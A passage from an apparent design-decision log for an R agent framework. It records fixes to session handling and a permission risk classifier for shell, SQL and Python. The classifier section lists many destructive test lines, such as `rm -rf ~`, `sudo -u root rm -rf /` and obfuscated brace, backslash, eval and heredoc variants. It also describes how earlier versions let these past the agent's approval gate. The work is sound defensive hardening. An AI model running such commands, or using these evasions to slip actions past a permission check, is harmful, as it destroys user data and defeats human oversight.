`[ FAIL 15 | WARN 3 | SKIP 0 | PASS 72 ]` (`task7-fix1-red-final.log`). The 15 failures are the
12 prefilter rows, the missing `invalid_names` and 2 leaked warnings; the 3 WARN are leaked
warnings. Round-1 `^tool-search$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 87 ]` in the UTF-8 and
the C locale (`task7-fix1-green.log`, `task7-fix1-green-clocale.log`). Review round 2 adds 4
backreference rows and a brace check to the prefilter block, and the block "a match-limit failure
is reported without rows and loses only the lines it hits" (13 expectations). The final test file
against the round-1 source (scratch copy) gives `[ FAIL 13 | WARN 0 | SKIP 0 | PASS 91 ]`
(`task7-fix2-red-final.log`), before the brace check was added. The brace check alone failed on
the in-tree source before its fix: `[ FAIL 1 | WARN 0 | SKIP 0 | PASS 104 ]`
(`task7-fix2-red-brace.log`). Round-2 `^tool-search$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 105 ]`
in the UTF-8 and the C locale (`task7-fix2-green.log`, `task7-fix2-green-clocale.log`). Review
round 3 adds the blocks "a skipped file over 20 MB is reported with or without rows, in the text
and prints" (10 expectations, a sparse 21 MB fixture) and "the prefilter is off when ignorable
pattern text precedes a possessive +" (8 pattern rows and 2 checks that a fixed case-insensitive
pattern and an `(?i)` pattern keep the prefilter). Against the round-2 source (in tree, before
the fix): `[ FAIL 15 | WARN 0 | SKIP 0 | PASS 110 ]` (`task7-fix3-red.log`): 7 missing notices
and the 8 rows. Final `^tool-search$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 125 ]` in the UTF-8 and
the C locale (`task7-fix3-green.log`, `task7-fix3-green-clocale.log`).

## D-058 - P09 model text: the context-pressure check reads the session's own last request, takes all-unknown token counts as no evidence, and survives a failing compact.should (2026-10-04)

P09 Task 9's plan-literal `eval_pressure()` (`R/eval-format.R`) was changed in three ways. The
signature of `format_eval_result()`, its result fields, its text layout and the plan's 10 test
blocks (`tests/testthat/test-eval-format.R`) are unchanged; `eval_budget()` is plan-literal.

1. **Only the session's own usage rows count.** The plan took the last row of
   `session_data(s)$usage`. P06's `usage_add()` charges every request to the session and to each
   live ancestor (root charging, IC-66), so the last row of a parent can be a child's (a
   sub-agent) request, whose context is not the parent's. The row's `session` column holds the
   requesting session's id, and `eval_pressure()` now keeps the rows with
   `session == session_data(s)$id` before it takes the last one.
2. **All-unknown token counts are not zero.** IC-74 (`spec/07-local-ollama.md` section 5):
   "Missing usage remains unknown." When every token count of that row (input, cache read, both
   cache writes, output) is `NA`, the plan summed them to 0 and asked `compact.should(s, 0, 0)`.
   The check now returns `FALSE` (no evidence of pressure, no halving) without asking. Partly
   known rows still sum their known counts, as in the plan.
3. **A failing `compact.should` never fails the `r` result.** The service call is wrapped in
   `tryCatch(..., error = function(e) FALSE)`, as P06's `run_compact_check()` wraps the same
   service. An evaluation never throws (04 section 2.2); its formatter, which runs after the
   code's side effects, now cannot throw because of P07 either.

P07 is not implemented, so without a registered `compact.should` the budget is never halved
(the plan's "absent: no halving"). Validation: `progress/P09.md`, Task 9. Two added blocks, "context
pressure asks compact.should with twice the session's last request" (7 expectations) and
"format_eval_result halves its budget while the session is under pressure" (3), mock
`session_data()`, `ext_service_has()`, `ext_service_get()`, `eval_session()` and
`eval_pressure()`. Against the plan-literal source
(`dev/.validation/P09/task9-eval-format-plan-literal.R`): `[ FAIL 4 | WARN 0 | SKIP 0 | PASS 34 ]`
(`task9-red-adaptations.log`). The child row is counted (18200 tokens instead of 3200, then
`TRUE` instead of `FALSE`), the all-`NA` row is asked (3 calls instead of 2), and the failing
service throws "compactor failed".

## D-059 - P06 ctx.kernel: session verbs need a session ctx, ctx$run honours the ctx's own run id, set_model records the thinking level and refuses bad input at once, append_entry refuses unencodable data and gptr.* types, an abort inside the dispatcher waits for the call and a call whose own hook aborted is not executed, members see the run executing on the stack, a pending switch applies when the run settles, an abort while a request is prepared starts no transfer (2026-10-04)

P06 Task 15's literal `ctx_kernel()` (`R/agent-run.R`, the `ctx.kernel` service of IC-34 behind
the P06 members of 04 section 10.6) is changed in these ways. The member names, their argument
lists and P02's calling convention are the plan's; the plan's 9 test blocks pass unchanged.

1. **A process-level ctx** (`ctx$session` `NULL`): `send`, `set_model` and `append_entry`
   signal `gptr_error_invalid_argument` with `arg = "ctx"` instead of base R errors from
   `session_enqueue(NULL)` and `session_data(NULL)`; `state` returns `NULL`.
2. **`ctx$run` falls back to the run id the ctx was created for** (P02's `ctx_new(session,
   run)`) when the kernel finds no run. Without it, registering the kernel broke P02's
   `test-ext-api.R:399` (`ctx_new(NULL, run = list(id = "u1"))$run` gave `NULL`).
3. **`set_model(ref, thinking)` records the level and refuses bad input at once.** `thinking`
   must be one of P05's levels (`arg = "thinking"`); the reference is resolved purely
   (IC-74) and a decision-only model refused (D-017) before anything changes, also inside a run
   (the plan set `pending_model` unchecked, and the user's run failed at its next request). The
   level is passed as the reference's `:<level>` suffix, so P05 clamps it and the
   `model_change` entry carries it (`gptr$thinking`); the plan wrote no entry at all for a
   thinking-only change and an entry without the level otherwise. `run_target()` applies a
   pending switch the same way. Router references keep the plan's behaviour.
4. **`append_entry(type, data)` refuses before appending**: data `json_encode()` cannot encode
   (`arg = "data"`; the plan's `session_append()` had already added the entry in memory when the
   store failed), and a resulting `gptr.<type>` (`arg = "type"`): those entry types belong to
   gptr (04 section 4.6) and its readers trust them (`rebuild_mode()` would let a plugin whose
   source is `plugin:gptr` switch a resumed session to `auto` with a `gptr.mode_change`).
5. **`send()` labels its own queue item** (by its position before the enqueue), not the last item,
   which a `queue_update` hook may have added.
6. **`abort()` inside the dispatcher only raises the run's abort signal**: while a tool executes
   (the plan's rule) and also while the run's status is `tools` (a `tool_call`,
   `permission_request` or `tool_result` hook of a call). In the plan such a hook settled the run
   at once, and the dispatcher then ran the permission check and the tool in the settled run and
   recorded the result after `agent_end`. The first abort's reason is kept. The dispatcher (P06
   Task 7, `R/agent-dispatch.R` `dispatch_steps()`) now checks the signal after the `tool_call`
   hooks and again after `perm_check()`: a call whose own `tool_call` or `permission_request`
   hook aborted (or that an abort from elsewhere reached during its permission prompt) gets the
   error result "Tool call not executed: the run was aborted (<reason>)." and neither its
   checkpointers nor the tool run, so a guard plugin that aborts on a dangerous call stops its
   side effects (in the plan, and in this task's first version, the tool still executed).
7. **Members act on the run executing on the call stack first** (`run_current()` when it belongs
   to the ctx's session), else `session_live(s)$run` (the plan). A run settled while its tool
   still executes (an abort from elsewhere) now still answers `ctx$aborted()` `TRUE` and
   `ctx$run` with its id; `envir` falls back to the kept home when the run released its
   evaluation environment; `set_model` applies at once to a settled run's session.
8. **`state()` seeds its environment only from a named list** (a malformed stored `gptr.ext`
   starts empty instead of failing in `list2env()`), and `ctx_ext_label("plugin:")` is
   `"plugin"`.
9. **A pending `set_model()` switch applies when the run settles first** (`run_settle_model()`,
   called by `run_settle()`). The plan's switch inside a run lived only in `run$pending_model`,
   read by `run_target()` at the run's next request, so a call during the run's last reply (a
   `message_end` or `turn_end` hook, a callback while the reply streams, a run ending on
   `max_turns`) returned `invisible(NULL)` and was silently dropped: no `model_change` entry, the
   old model kept. 04 section 10.6 and IC-69 promise "a `model_change` at the next request
   boundary"; the run's end is that boundary. It applies whatever the run's status, and a failure
   there (the provider went away, a store failure) is a registry diagnostic (`event =
   "set_model"`) that never interrupts the settlement.
10. **An abort while a request is prepared stops the request** (`run_request()`, P06 Task 10):
    after `run_target()` (a `model_select` hook), after the `before_request` emit and after the
    `request_params` chain the request returns through `run_abort()` when the run is signalled or
    settled (`run_halted()`). In the plan a `before_request` hook calling `ctx$abort()` settled
    the run (`agent_end`, transfers cancelled) and `run_request()` then marked the run busy and
    `requesting` and called `provider_stream()`, a transfer that nothing cancelled.

Validation: `progress/P06.md`, Task 15. Twelve blocks were added to `test-agent-run.R` (81
expectations; the last four and the changed dispatcher block come from the review, round 1).
Against the plan-literal source, `^agent-run$` gives `[ FAIL 11 | WARN 1 | SKIP 0 | PASS 540 ]`
(`task15-literal.log`, before the review), every failure in the added blocks; the review's
regression tests against the first version: `[ FAIL 11 | WARN 0 | SKIP 0 | PASS 592 ]`
(`task15-fix1-red.log`); final `^agent-run$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 603 ]`;
neighbours `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 6241 ]`; broad suite
`[ FAIL 0 | WARN 0 | SKIP 1 | PASS 8312 ]`.

## D-060 - P11 risk tables: a winning risk_rule row replaces only the cells it supplies, rows with an NA key are dropped (an NA subcommand is `*`), the table cache sees re-registered records (2026-10-04)

P11 Task 1's generators and checksums are the plan's (1492 and 434 rows; `tools::md5sum()` equals the
plan's values on R 4.5.0). Three defects of the plan-literal `R/perm-classify.R` concern the merge of
`risk_rule` records (04 section 10.2 row 33, section 11.15, IC-69):
1. **A winning row replaced the whole shipped row.** The kind requires only `package`, `function`
   and `level`, and the plan filled every missing column with `""`. A plugin raising `base::saveRDS`
   to level 3 therefore erased its category and its path argument `file`, and Task 3's walker would
   no longer see the path class of the saved file (`control` is level 4): raising a level lowered
   the risk. The row now replaces only the cells it supplies: the columns its record has, and in
   that row only the cells that are not NA (rows bound together with `rbind()` or
   `dplyr::bind_rows()` leave NA where a row gave no value). A new row still gets `""` for missing
   and NA text cells.
2. **Rows with an NA key matched every lookup of the same name.** `rows$package == pkg` is NA for an
   NA package, so `risk_lookup("wipe", "mypkg")` returned an all-NA row. Rule rows with an NA
   `package`, `function` or `command` are dropped. An NA `subcommand` means `*`, as an omitted
   `subcommand` column does, so the row is kept. NA text in the other columns becomes `""` on a new
   row (a later `nzchar(path_arg)` stays false), and factor columns become text.
3. **The cache could serve a stale table.** It was keyed by the registry generation, the number of
   records and their names, so removing a record and registering one of the same name with other
   rows kept the old table. The key now hashes the records' name, rows and `lower`
   (`hash_xxh128()`, P01).
The glob rows' regular expressions are compiled once per merged table (no behaviour change).

Validation: `progress/P11.md`, Task 1. Two blocks were added to `test-perm-classify.R`
(10 expectations); against the plan-literal source they fail 5 (`task1-probe-plan-literal.log`).
Review round 1 extended item 1 to NA cells and item 2 to NA subcommands: 6 expectations in the
first added block and a third added block (4); against the round-0 source they fail 4
(`task1-fix1-red.log`). Final `^perm-classify$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 116 ]` in the
UTF-8 and the C locale.

## D-061 - P11 command, SQL and Python classifiers are fail-safe and follow the classifier standard (level 0 is an allowlist of known read-only programs, options and literal or plain-parameter words; a construct gptr does not model is at least level 3; level 4 needs a target literal text identifies): a command line is read as bash and as sh read it (comments, heredocs, ANSI-C quotes, brace expansion, redirect descriptors, backslashes, substitutions, cd, case), null devices, parameter defaults and shell-word paths are followed, a glob takes the class of the guarded names it can match, wrappers, eval, shell keywords (only unquoted ones are keywords) and literal text fed to a shell or an interpreter never hide a command, program-running options and environment values are read as command lines, values the line assigns and names a lister prints are read where they are used, every directory a cd can leave the shell in is read, every write, every guarded operand of an unmodelled program, a link's source and git's working-tree paths take their path class, deleting a top-level directory is level 4, a file a command reads takes its read level, a secret with a network sink (also from ssh, scp, rsync, /dev/tcp, SQL and environment dumps) is level 4, SQL is lexed in one pass per dialect and EXPLAIN takes the explained statement's level, SQL code channels, stored code, function-form pragmas and COPY ... PROGRAM lines are read, SQL and Python writes to literal guarded paths take their class, Python's command lines, R calls and unpickling are read, R stopped from a shell or from Python is q(), a glob can stand for any guarded name, PCRE patterns anchor with \z, sed scripts and awk programs are parsed before they are searched, a program run from a path, an unknown git subcommand and an environment variable outside an allowlist are level 3, long options are read by prefix and git remote, config and stash by verb, a guarded name below a directory the shell computes keeps its class, git commands that print files read them, environment names code computes and R's /proc environ are secret reads, ps and jq options are not inert, `for NAME do`, a `[[ ]]` before a reserved word and a `function NAME` body hide no command, SQL reads every literal that may name a file but a compared value, Python's writes to gptr's and R's environment variables are control, an unquoted glob that can expand to an option is an option the shell computes and uniq and xxd may write a glob's second name, a glob that can move awk, sed, jq or yq program text, git's subcommand or verb, a ps or date word or less's `+` command is computed and a glob pattern or option value is read as the files it can hand the program, gawk's and the one-true-awk's readings of awk -W, the list files sort, wc, du, file, find and tree read names from, xxd's and uniq's option words and yq's flags are read, an inert program's option that reads a file it names is read as a glob, an attached `-f` value, GREP_OPTIONS or strings' `@FILE`, a function Python imports from a module is read as that module's call, file's magic files, blame's revision lists, tree's intro and outro files and git's message and pathspec files are read with their contents and a long glob word costs linear time, Python's open() modes in any letter order, a from-imported environ and PowerShell's env: drive are read, text enters through as_utf8() (2026-10-05)

P11 Task 2 appends the plan's G5 classifiers (`risk_command()`, `risk_sql()`, `risk_python()`, the
flag-row helpers, `risk_path_class()`, `risk_cmd_row()`, `risk_cmd_edits_parity`) with the plan's
interfaces and call texts; all 55 plan expectations pass unchanged, and so do the later P11 tasks'
command, SQL and Python cases. The classifier is advisory (G5, 03 section 6.8), but a level-0 result
runs without asking in every mode (plan mode included), so the plan-literal code had to be hardened
where it returned level 0 or 1 for code that runs programs, deletes or writes guarded files.

**Fail-safe principle (review round 3).** The command classifier is a heuristic in front of the
permission gate and cannot model every form of sh syntax. Where it does not fully model a
construct it gives the most conservative class the construct allows, never a level below the worst
reading sh can give the line: a path it cannot name is `unknown` (a write or delete of it is 3); a
word it can only partly name (a glob, a brace expansion, a relative path from an unknown
directory) takes the highest class of the guarded paths it can stand for; the guarded operands of
a program it does not model are flagged as writes; and code it cannot read (a computed command or
program word, a script file, a brace expansion too long to list, a quote or substitution that is
not closed, nesting deeper than 25) is level 3 `dynamic`, the level 03 section 6.8.1 gives dynamic
code (auto mode allows it; manual and edits ask). Level 4 is kept for what the classifier can see:
a critical, protected or control target, a command line it can read that is level 4, or a secret
read on a line with a network sink. Where bash (macOS /bin/sh, Git Bash) and dash (Linux /bin/sh)
read a line differently (brace expansion, a descriptor such as `10>`), both readings are
classified and the higher counts; so are the Windows and the sh reading of a backslash, and the
readings of a parameter default (round 4), and every directory a `cd` can leave the shell in
(round 5: it may fail). Items 1-10 are the rounds 0-2 behaviour; item 11 lists what round 3
added, item 12 what round 4 added, item 13 what round 5 added, item 14 what round 6 added,
item 15 what round 7 (the classifier standard) added, item 16 what round 8 added, item 17
what round 9 added, item 18 what round 10 added, item 19 what round 11 added, item 20 what
round 12 added, item 21 what round 13 added, item 22 what round 14 added, item 23 what
round 15 added and item 24 what round 16 added.

**The classifier standard (coordinator decision, review round 7; it wins over the wording above
and over items 1-14 where they differ).** (A) Level 0 means *known* read-only, never "nothing
flagged": it is an allowlist. A shell line is level 0 only when every simple command is a known
read-only program (a level-0 row of `risk-commands.csv`, or a modelled reading such as `find`
without actions) used with options the classifier reads as read-only, and every word is a
literal or a plain parameter reference (`$NAME`, `${NAME}`, `$1`, `"$@"` and the other special
parameters). (B) A construct the classifier does not model is at least level 3 (dynamic code, 03
section 6.8.1; computed commands, 6.8.4): arithmetic expansions and commands, `[[ ]]` with
arithmetic operators, parameter expansions with any operator, `let`, `declare`/`typeset`,
`printf -v`, `read` into variables, `eval`, `source`/`.`, aliases, computed programs, options and
awk/sed program text, unknown programs. Command text gptr can still recognise inside such a
construct is classified recursively and may raise the line further. (C) Level 4 is required
only where a critical or control target is identifiable from literal text (a literal path, a
glob that can match a guarded name, a recognised command, a q()-equivalent); a payload hidden
inside an unmodelled construct is level 3, which auto mode allows by design (the classifier is
advisory and not a security boundary, 6.8.1). The standard is about shell lines; Python is never
below 1, and SQL keeps its keyword reading (Known limits).
1. **Shell syntax.** Substitutions are found by a scan that follows quotes, backslashes and
   nesting, and each is classified as a command line, recursively (the plan read one level with a
   regular expression: `echo $(rm -rf ~ $(true))` was 0), process substitutions `<(...)`/`>(...)`
   too. Text in single quotes is no command (`awk '{print $(NF-1)}'` stays 0, `echo '$(rm -rf ~)'`
   is 0), double-quoted substitutions are (`echo "$(rm -rf ~)"` is 4). An arithmetic `$((...))` is
   no command, but substitutions inside it are. One that is not closed is level 3 `dynamic` and its
   text is classified too. A line that starts with `|` no longer throws. A wrapper, `sudo` or `xargs`
   without a command keeps its flag. Redirects are handled per simple command, and
   `cd`/`pushd`/`popd` set the directory that later relative paths and redirects resolve from
   (`cd .gptr && echo x > settings.json` was 2, now 4); a computed `cd` makes relative paths
   `unknown`; a `cd` in a subshell `( )` ends with it, and one in a pipeline or the background
   (`cd /tmp & rm -rf *`) changes nothing. A bare digit after `>` is a file; only after `>&` is it a
   descriptor; `>|` is `>`. The tokeniser reads backslash escapes (outside quotes before a shell
   metacharacter, quote, `$` or backtick, and `\"`, `\\`, `\$`, `` \` `` in double quotes; other
   backslashes stay, so Windows paths keep theirs, and a second reading drops them as sh does, item
   12): `echo \' ; rm -rf ~ ; echo \'` was 0, now 4.
   Before any scan the line is read as sh reads it (`risk_sh_prepare()`), at any nesting of
   `$(...)`: an unquoted `#` that starts a word comments out the rest of its line (`a#b`,
   `${x#a}` and `$#` are no comments); `$'...'` is ANSI-C quoting and is decoded (`\'`, `\xHH`,
   octal, `\u`); a backslash-newline is removed outside single quotes; a heredoc body (`<<WORD`,
   `<<-WORD` with its tabs, `<<'WORD'`, several on one line) is data up to its delimiter line, and
   the lines after it are commands again. An unquoted delimiter's body still runs its
   substitutions, and a shell that reads a heredoc or a here-string (`sh <<'EOF'`,
   `bash <<< '...'`) runs it as a command line. A `<<` inside `((...))` or `$((...))` is a shift.
   A line that ends inside an open quote is level 3 `dynamic`. Before review round 2 an
   apostrophe in a comment or a heredoc body opened a quote that hid every later line:
   `ls # don't` followed by `rm -rf ~` was 0, `echo $'\'' ; rm -rf ~` was 0,
   `"$\<newline>(rm -rf ~)"` was 0, and `cat > notes.md <<'EOF'` with the body `It's done`
   followed by `rm -rf ~` was 3.
2. **Null devices are not writes** (`/dev/null`, `/dev/stdout`, `/dev/stderr`, `/dev/tty`,
   `/dev/fd/1`, `/dev/fd/2`, `NUL`, `-`). G5 had a `null` path class; P01's `path_class()` puts
   `/dev/null` in `outside`, so `git status 2>/dev/null` was level 3 in the plan.
3. **Shell-word paths** (`risk_cmd_path_class()`): `$HOME`/`${HOME}` (and `${HOME:?}`,
   `${HOME:-x}`, `${HOME%/}`) is `~`, `$PWD` (and `$(pwd)`) the working directory; any other `$`,
   backtick or `%VAR%` word is `unknown` (P01 joined it to the root as `workspace`, so `cp x $DEST`
   was an edits-mode auto-approval; parameter defaults, Windows home names and `$OLDPWD`: item
   12). A glob takes its directory's class when that is `control`, `protected` or `instructions`
   (any glob in `.gptr/` is `control`), and a bare `*` in a critical
   directory is `critical` (`rm -rf *` at the root, `~/*`, `/*`, `"$PWD"/*`: 4, like `rm -rf ~`).
   Deleting or moving away the root, home, a directory above either (any expansion of `$HOME` or
   `$PWD`, such as `${PWD%/*}`), or a `.gptr/` directory is level 4. `~+` is the working
   directory; `~-`, `~+N`, `~-N` and `~login/...` are `unknown`, and deleting a bare `~login` (that
   user's home) is 4 (`rm -rf ~+` and `rm -rf ~root` were 3). Every write takes the path
   class of the file it writes (`risk_cmd_target_class()`, control category for `control`; a `.gptr`
   directory itself is `control`): all operands of `mkdir`/`touch`; for `cp`/`mv`/`ln`, the
   destination, or, when it is a directory (a `-t`/`--target-directory` value, a trailing `/`, `.`,
   `..`, `~`, more than one source, or an existing directory, unless `-T`), each source's name inside
   it (`cp settings.json .gptr/` is 4 `control`, `cp ../a.csv .` is 2 `workspace`; `src/.` copies
   any name; a glob name takes the class of the guarded names it can match there: dot names for a
   dot pattern, the control files inside `.gptr/`); guarded sources of `mv`; `chmod`/`chown` targets
   of class `control` or `critical`; and the targets of redirects, `tee`, `time -o`,
   `find -fprint*`/`-fls`, sed `w` and `-i`, `gawk -i inplace`, the second operand of `uniq` and
   `xxd`, `sort -o`/`--output`, `tree -o`, gawk's `-o`/`-p`/`-d` (an attached file, else
   `awkprof.out` or `awkvars.out`) and the literal files an awk program prints to
   (`print "x" > "f"`), curl's `-o`, `-O` (the URL's name, both in `--output-dir`), `-D`, `-c`,
   `--trace*`, `--libcurl`, `--stderr`, `--etag-save`, `--hsts`, `--alt-svc`, wget's `-O`, else
   each URL's name (in `-P`), and its `-o`/`-a`/`--save-cookies` files, PowerShell's `-OutFile`,
   and git's outputs (item 5); options are read in every spelling (item 6).
4. **Environment prefixes** that choose the program or what it loads (`PATH`, `LD_*`, `DYLD_*`,
   `HOME`, `GIT_SSH*`/`GIT_EXTERNAL_DIFF`/`GIT_CONFIG*`/..., `BASH_ENV`, `PAGER`, `EDITOR`,
   `PYTHONPATH`, `NODE_OPTIONS`, `R_PROFILE*`, ...) are level 3 `dynamic`: the open question of G5
   (line 189) that the research digest's security notes answer with level 3. `LC_ALL=C` stays 0.
5. **git.** The global options that take a value are skipped with it, as the next word or after
   `=` (`-C`, `-c`, `--config-env`, `--git-dir`, `--work-tree`, `--namespace`, `--super-prefix`,
   `--attr-source`): `git --namespace status push --force origin main` read `status` as the
   subcommand and was 0, now 3. A writing subcommand on a `--work-tree` or `--git-dir` of class
   `control`, `protected` or `instructions` writes there (`git --work-tree .gptr checkout -- .` is
   4 `control`; a `.git` directory is not counted). `-c`/`--config-env` with a key outside an
   allowlist of keys that cannot run a program
   (pager keys are checked by value, so the plan's `-c core.pager=cat` stays 0; `core.fsmonitor`,
   `alias.*`, `core.sshCommand` are 3), `--exec-path=`, `--upload-pack`/`--receive-pack`/`--exec`,
   `rebase -x`, `grep -O`, `bisect run` and `submodule foreach` are `dynamic` (and their command
   lines are classified, item 12; so are the working-tree paths git deletes, moves, restores or
   creates). A bare `git stash` (push and reset) is 2, `git branch <name>`/`git tag <name>` (listing forms stay 0) are 2, `reflog
   expire|delete` is 3. Levels are only raised, so `-D` never lowers a row a `risk_rule` raised; the
   plan's `branch -d`/`tag -a` kept category `read` at level 2, now `file_write`. Files git writes
   take their path class, resolved from `-C`: `--output`, `archive -o`, `format-patch -o DIR`
   (`DIR/*.patch`) and `bundle create FILE`. `git config` storing a key whose value git later runs
   or loads (`core.fsmonitor`, `core.hooksPath`, `core.editor`, `alias.*`, `credential.*helper`,
   `diff.*.textconv`, `filter.*`, `include.path`, ...; pager keys checked by value) is level 4
   `control` on `.git/config` (or `<git-dir>/config`, or the `--file`, `--global`, `--system`
   file): later level-0 git commands would run it. Other settings written to a `--file`/`-f`,
   `--global` or `--system` file take that file's path class (`git config --file
   .gptr/settings.json user.name me` was 2 with no path, now 4 `control`); `git config user.name
   me`, which git writes to the repository's own `.git/config`, stays 2.
6. **Read-table programs with options that run code or write files**: sed (combined `-ni`,
   `-i.bak`; GNU `e`, `w`/`W` and the `e`/`w` flags of `s`; `--sandbox` turns them off; BSD
   `-i ''`/`-i .bak`), find (leading `-H`/`-L`/`-P` skipped; `-delete` and `-exec rm` take the start
   paths' delete level), fd `-x`/`-X`, rg/ag `--pre`/`--pager`, sort `--compress-program`, awk pipes
   to or from commands and `getline`, yq `-i`, printf of a secret-looking variable, curl data flags in
   attached and combined forms (`-d@file`, `-sd`), wget `--post-data=`/`--method`/`--body-*`, httpie
   `POST`/`PUT`/`PATCH`/`DELETE`. These options are read with `risk_cmd_args()`: a short-option
   cluster gives one option per letter up to the first that takes a value, which takes the rest
   of the word or the next word (`sort -uo FILE`, `yq -Pi`, `curl -so FILE`, `wget -qO FILE`;
   `sort -to x` is `-t o`, `yq -oi` is `-o i`); tree's value letters each take the next word, in
   order; a long option that is a prefix of a listed one is that option, as getopt_long() reads
   it (`sort --out=F`, `gawk --dump=F`, `cp --targ=DIR`; not for curl and yq, which read long
   options in full); gawk's optional values are only attached, and `xargs -i`/`--replace` take no
   separate value. Before review round 2, `sort -uo .Rprofile`, `tree -ao .gptr/settings.json`,
   `yq -Pi ... .gptr/settings.json` and `gawk -o.gptr/settings.json` were 0.
7. **SQL** is lexed once, left to right (strings, quoted identifiers, dollar quotes, `--` and block
   comments; MySQL's executable `/*! */` stays code), with and without backslash escapes, and the
   higher result wins. The plan stripped comments before strings, so `SELECT '--'; DROP TABLE t` was
   0, and a block comment over two lines made `SELECT 1` level 3. An EXPLAIN takes the level of the
   statement it explains (item 11).
   Statements are classified in one pass (20,000 statements, 800 KB: 8.3 s with one bind per
   statement for both lexings, 0.4 s after). Two MySQL lexings (with and without backslash
   escapes) read `#` as a comment, `--` as one only before white space or a control character,
   and no dollar quotes: `SELECT 1--1; DROP TABLE t` and `SELECT $$; DROP TABLE t; $$` were 0, now
   3. With backslash escapes `\"` is escaped inside double quotes too. A lexing whose blanked text
   equals an earlier one is not classified again (the same 20,000 statements: 0.2 s).
8. **Python**: `from os|shutil|pty import` of process and delete functions, and `os.rename`/
   `replace`/`makedirs`/... and `shutil.copy*`/`move` (file writes) are flagged.
9. **Input**: command, SQL and Python text enters through P01's `as_utf8()`. The file
   `utils-encoding.R` is the only place allowed to convert from the native encoding, because in a C
   locale that conversion rewrites UTF-8 bytes as `<c3><a9>`, which the tokeniser reads as
   redirects. Bytes that are neither UTF-8 nor marked latin1 are level 3. A vector of SQL or Python
   is joined with newlines (the plan's `if (grepl(...))` threw on length > 1). NA is `""`.
   `risk_path_class()` also maps P01's translation warning (a non-ASCII path in a C locale) to
   `unknown`, as its documented contract says. The tokeniser collects characters by index (linear
   time on long quoted words).
10. **Wrappers and shell keywords never hide the command they run.** The options of `sudo`,
    `doas`, `env`, `nice`, `timeout` (and its duration), `time`, `stdbuf`, `xargs`, `exec` and
    `command` are skipped with their values (`-u root`, `-uroot`, `-Eu root`, `--user=root`, `--`);
    `env -C`/`sudo -D` set the directory, `env -S` splits its string into the command, `env -P` is
    `dynamic`, `env` with only options or assignments prints the environment (2 `secret`), `command
    -v` only looks up, `sudo -e` writes its files, `su -c` and a shell's `-c` (`bash -lc`, `sh -o
    pipefail -c`) classify their command line. An unknown program, or a wrapper option gptr does not
    know, also has its first later word that names a known program classified (`chrt 10 rm -rf ~`
    is 4). Shell keywords (`!`, `{`, `}`, `if`, `then`, `else`, `elif`, `while`, `until`, `do`,
    `done`, `fi`, `esac`) run nothing; `for`/`select`/`case` words are data; a `function` body is
    classified; `( )` is a subshell; `[[` is `[`. The plan made `sudo -u root rm -rf /`,
    `nice -n 10 rm -rf ~`, `(rm -rf ~)`, `if true; then rm -rf ~; fi` and `bash -c 'rm -rf ~'` level
    3, which auto mode allows, so the critical guard and the control `ask_human` were bypassed.
    `eval` joins its words and classifies them as a command line (`eval 'rm -rf ~'` was 3, now 4).
    A program word with a backslash is also classified as sh reads it, without the backslashes,
    when that names a known program (`r\m -rf ~` and `c\p settings.json .gptr/` were 3, now 4;
    `C:\Git\bin\git.exe status` stays 0). Substitutions, `-c`, `eval` and heredoc lines nested
    deeper than 25 levels are level 3 `dynamic`, not read.
11. **Review round 3 (fail-safe).**
    - *Operators and descriptors.* Operator tokens carry a byte typed text never holds, so a quoted
      `'<;>'` or `'<|>'` is a word (`rm '<;>' -rf ~` was 3, now 4). A redirect's descriptor is part
      of it: one digit in sh, any run of digits or a `{name}` in bash, also before `<<` and `<<<`
      (`cp a.txt .gptr/settings.json 9>/dev/null`, `3>&1`, `10>/dev/null`, `{fd}>/dev/null`,
      `3<<EOF` made the descriptor an operand and the destination a directory `9/`: 2, now 4).
      `<>` (and `1<>`, `3<>`) writes its target at the target's path class (`cat <> .Rprofile` was
      0); `<`, `<&N` and the file read are no operands (`cp a.txt .gptr/settings.json < in.txt` was
      2); `>&N`, `>&N-` and `>&-` duplicate or close a descriptor (`echo x 2>&1-` was 2, now 0).
    - *Brace expansion.* An unquoted `{a,b}` or `{a..b}` (`{1..9..2}`, zero-padded or not, nested
      groups; `${` starts no group; each alternative once; empty words dropped) becomes its words
      before the line is read (`{rm,-rf,~}`, `rm -rf {.gptr,x}`, `rm -rf .{a..h}ptr`,
      `echo x > {.Rprofile,}` were 2 or 3, now 4). dash does not expand, so the unexpanded reading
      is classified too. More than 1,024 words: each group is read as the glob `*`, plus a 3
      `dynamic` row (`rm -rf .{a..z}{a..z}{a..z}{a..z}` is 4 through `.****`).
    - *Globs.* `[` is a glob character. A glob takes the highest class of the paths it can name
      (`risk_glob_paths()`): per glob component, the guarded names of its directory it can match
      (the dot names `.gptr`, `.git`, `.Rprofile`, `.ssh`, ... only for a pattern that can match a
      leading dot, `[.]` included, or with the line's dotglob, globdots or GLOBIGNORE; the control
      files of `.gptr/`; `config` and `hooks` of `.git/`; for deletes, the next directory toward the
      project root or the home directory, so `../*` names the project), and one ordinary name. A
      pattern that matches every name (`*`, `?*`, `[!.]*`, `.*`) in a critical directory is critical.
      Deletes (rm family, find start paths, mv sources), writes and chmod targets read globs this
      way: `rm -rf .g*`, `.[g]ptr`, `[.]gptr`, `.??*`, `?*`, `[!.]*`, `~/.s*`, `*/.git`,
      `find .g* -delete` and `mv .gp?r old` were 3, `echo x > .Rprofil[e]` and `cp x .git/c*` 2 or
      3; all are 4. `rm -rf build/[a-z]*` and `rm -f *.l[o]g` stay 3.
    - *mv sources.* A source outside the project or of class `unknown`, `wildcard` or `url` is the
      delete rm would be: 3 `file_delete`, 4 for a wipe (`mv /etc/x .`, `mv $SRC out/x.csv`,
      `mv *.csv data/` were 2).
    - *Unknown working directory.* A relative word is also read from the project root and from its
      `.gptr/`; a guarded class or a wipe found there wins over `unknown` (`cd $DIR && rm -rf .gptr`,
      `cd $DIR && echo x > settings.json`, `cd .gp* && ...` and `cd ~- && rm -rf *` were 3, now 4).
      A substitution before the line's first `cd` runs in the known directory
      (`echo $(echo x > notes.txt); cd $DIR` was 3, now 2); one after it runs in an unknown
      directory and in each directory a literal `cd` of the line names
      (`(cd .gptr; echo $(cat > settings.json))` was 3, now 4).
    - *case.* The `)` after a case pattern closes no subshell or substitution and pattern words are
      data (`(cd .gptr; case x in a) ;; esac; echo x > settings.json)` was 2,
